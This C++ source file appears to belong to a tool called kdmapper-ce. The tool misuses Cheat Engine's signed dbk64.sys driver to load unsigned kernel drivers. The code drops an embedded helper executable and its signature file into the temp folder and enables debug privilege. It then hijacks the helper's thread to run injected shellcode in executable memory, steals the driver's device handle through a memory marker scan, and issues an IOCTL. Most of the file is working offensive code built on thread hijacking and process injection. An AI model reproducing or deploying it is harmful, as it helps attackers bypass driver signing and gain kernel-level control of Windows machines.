#include "kdmapper_ce.hpp"

HANDLE kdmapper_ce::CreateKernelModuleUnloaderProcess() {
  
    HANDLE result = INVALID_HANDLE_VALUE;

    // drop kernelmoduleunloader.exe into the %temp% folder

    std::wstring UnloaderPath = utils::GetFullTempPath() + L"\\" + L"Kernelmoduleunloader.exe";
    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe", kernelmoduleunloader_resource::kernelmoduleunloader, sizeof(kernelmoduleunloader_resource::kernelmoduleunloader));

    // adjust process token

    BOOL bRet = FALSE;
    HANDLE hToken = NULL;
    LUID luid = { 0 };

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        {
            TOKEN_PRIVILEGES tokenPriv = { 0 };
            tokenPriv.PrivilegeCount = 1;
            tokenPriv.Privileges[0].Luid = luid;
            tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
    }
    if (!bRet) {
        Error("RtlAdjustPrivilege failed");
        return result;
    }

    // kernelmoduleunloaderプロセスを作成

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // TODO: hide kernelmoduleunloader's popup

    if (!CreateProcess(NULL,
        (LPWSTR)UnloaderPath.c_str(),
        NULL,
        NULL,
        TRUE,          // bInheritHandles: Because shellcode requires SE_PRIVILEGE_ENABLED
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi))
    {
        Error("CreateProcess failed 0x%x", GetLastError());
        return result;
    }

    result = pi.hProcess;
    //CloseHandle(pi.hThread);
    //CloseHandle(pi.hProcess);
    return result;
}

HANDLE kdmapper_ce::GetDbk64DeviceHandleByInjection(HANDLE hTargetProcess) {

    // kernelmoduleunloader.exe process のスレッドをhijack

    HANDLE hDevice = INVALID_HANDLE_VALUE;
    HANDLE threadHijacked = NULL;
    HANDLE targetThread = NULL;
    HANDLE snapshot;
    THREADENTRY32 threadEntry;
    CONTEXT context;
    DWORD targetProcessID = GetProcessId(hTargetProcess);

    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);

    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == targetProcessID)
        {

#ifdef _DEBUG
            Log("OwnerProcessID:%d TargetThreadID:%d", threadEntry.th32OwnerProcessID, threadEntry.th32ThreadID);
#endif // _DEBUG

            targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
            break;
        }
    }

    if (targetThread == NULL) {
        Error("OpenThread failed");
        return hDevice;
    }

    // inject shellcode

    SIZE_T shellcode_size = sizeof shellcode_resource::shellcode;

    HANDLE remoteShellcodeBuffer = VirtualAllocEx(hTargetProcess, NULL, shellcode_size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteShellcodeBuffer == NULL) {
        Error("VirtualAllocEx failed");
        return hDevice;
    }

    WriteProcessMemory(hTargetProcess, remoteShellcodeBuffer, shellcode_resource::shellcode, shellcode_size, NULL);

    // hijack the main thread of kernelmoduleunloader

    WOW64_CONTEXT ct32;
    ZeroMemory(&ct32, sizeof(PWOW64_CONTEXT));

    Wow64SuspendThread(targetThread);
    
    ct32.ContextFlags = CONTEXT_CONTROL;
    Wow64GetThreadContext(targetThread, &ct32);
    
    ct32.Eip = (DWORD)remoteShellcodeBuffer;
    
    Wow64SetThreadContext(targetThread, &ct32);
    ResumeThread(targetThread);

    //Sleep(1000); // 1s

    // patternでkernelmoduleunloaderのプロセスメモリをスキャン

    MEMORY_PATTERN  pattern = { 0x12345678, NULL, 0x12345678 };

    MEMORY_PATTERN* tmp_pattern = (MEMORY_PATTERN*)SearchMemoryForPattern(
        hTargetProcess,
        pattern,
        PAGE_READWRITE,
        MEM_COMMIT,
        MEM_PRIVATE
    );
    
#ifdef _DEBUG
    Log("%x, %d, %x", tmp_pattern->marks, tmp_pattern->handle, tmp_pattern->marks2);
#endif // DEBUG

    if (tmp_pattern->marks == 0x12345678 && tmp_pattern->marks2 == 0x12345678) {
        hDevice = (HANDLE)tmp_pattern->handle;
    }

    return hDevice;
}

LPVOID kdmapper_ce::SearchMemoryForPattern(HANDLE hProcess, MEMORY_PATTERN pattern, DWORD flProtect, DWORD flAllocationType, DWORD flType) {

    LPVOID offset = 0;
    LPVOID lpBuffer = NULL;
    MEMORY_BASIC_INFORMATION mbi = {};
    
    lpBuffer = VirtualAlloc(NULL, sizeof(MEMORY_PATTERN), MEM_COMMIT, PAGE_READWRITE);
    if (lpBuffer == NULL) {
        Error("VirtualAlloc failed");
        return NULL;
    }

#ifdef _DEBUG
    printf("BaseAddress");
    printf("\tRegionSize");
    printf("\tProtect");
    printf("\tState");
    printf("\tType\n");
#endif // _DEBUG

    while (VirtualQueryEx(hProcess, offset, &mbi, sizeof(mbi)))
    {

#ifdef _DEBUG
        printf("0x%08x", mbi.BaseAddress);
        printf("\t%08x", mbi.RegionSize);
        printf("\t%02x", mbi.AllocationProtect);
        printf("\t%05x", mbi.State);
        printf("\t%08x\n", mbi.Type);
#endif // _DEBUG

        // Compare patterns

        ReadProcessMemory(hProcess, mbi.BaseAddress, lpBuffer, sizeof(MEMORY_PATTERN), NULL);
        SIZE_T res = RtlCompareMemory(lpBuffer, (const void*)&pattern, sizeof(MEMORY_PATTERN));
        
        if (mbi.AllocationProtect == flProtect && mbi.State == flAllocationType && mbi.Type == flType && res != (SIZE_T)0)
        {
            Log("Pattern found at 0x%x (match pattern count: 0x%d)", mbi.BaseAddress, res);
            break;
        }
        
        if(mbi.BaseAddress > (PVOID)0x7fffffff)
        {
            Error("Scan error: No pattern found");
            break;
        }

        offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
    }

    return lpBuffer;
}


HANDLE kdmapper_ce::GetDbk64DeviceHandle()
{
	HANDLE hDbk64                              = INVALID_HANDLE_VALUE;
    HANDLE hKernelModuleUnloader     = INVALID_HANDLE_VALUE;

    hKernelModuleUnloader = CreateKernelModuleUnloaderProcess();
    if (hKernelModuleUnloader == INVALID_HANDLE_VALUE) {
        Error("CreateKernelModuleUnloaderProcess failed");
        return hDbk64;
    }

    // drop kernelmoduleunloader.exe.sig into the %temp% folder

    utils::CreateFileToTempFromResource(L"Kernelmoduleunloader.exe.sig", kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig, sizeof(kernelmoduleunloader__sig_resource::kernelmoduleunloader_sig));
        
    // Inject the shellcode into the KernelModuleUnloader.exe process to get the device handle of dbk64.sys.

    HANDLE hOriginalDbk64 = GetDbk64DeviceHandleByInjection(hKernelModuleUnloader);
    if (hOriginalDbk64 == INVALID_HANDLE_VALUE || hOriginalDbk64 == NULL || hOriginalDbk64 == (HANDLE)0xffffffff) {
        Error("GetDbk64DeviceHandleByInjection failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    // Convert a handle obtained by kernelmoduleunloader into a handle that can be used by kdmapper-ce

    if (!DuplicateHandle(hKernelModuleUnloader, hOriginalDbk64, GetCurrentProcess(), &hDbk64, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
        Error("DuplicateHandle failed");
        TerminateProcess(hKernelModuleUnloader, 0);
        CloseHandle(hKernelModuleUnloader);
        return hDbk64;
    }

    Log("Duplicated Dbk64.sys handle: 0x%d (original: 0x%d)", hDbk64, hOriginalDbk64);

    // Close process and process handles. 

    TerminateProcess(hKernelModuleUnloader, 0);
    CloseHandle(hKernelModuleUnloader);
	
    return hDbk64;
}

BOOL kdmapper_ce::MapDriver(HANDLE dbk64_device_handle, HANDLE hDriver, NTSTATUS* exitCode)
{
    #define IOCTL_UNKNOWN_BASE					FILE_DEVICE_UNKNOWN
    #define IOCTL_CE_TEST							CTL_CODE(IOCTL_UNKNOWN_BASE, 0x0804, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
   
    char OutputBuffer[100];
    char InputBuffer[100];
    ULONG bytesReturned;

    memset(OutputBuffer, 0, sizeof(OutputBuffer));
    memset(InputBuffer, 0, sizeof(InputBuffer));

    BOOL bRc = DeviceIoControl(dbk64_device_handle,
        (DWORD)IOCTL_CE_TEST,
        &InputBuffer,
        (DWORD)strlen(InputBuffer) + 1,
        &OutputBuffer,
        sizeof(OutputBuffer),
        &bytesReturned,
        NULL
    );

    return TRUE;
}

